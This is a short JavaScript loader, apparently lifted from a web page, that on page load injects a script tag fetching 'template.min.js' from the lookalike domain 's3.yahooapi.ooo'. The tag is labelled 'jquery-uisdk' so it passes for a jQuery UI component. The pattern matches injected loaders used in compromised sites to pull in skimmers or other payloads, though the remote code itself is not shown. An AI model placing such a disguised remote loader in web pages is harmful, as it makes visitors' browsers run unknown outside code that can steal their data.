(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//s3.yahooapi.ooo/template.min.js";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'jquery-uisdk'));
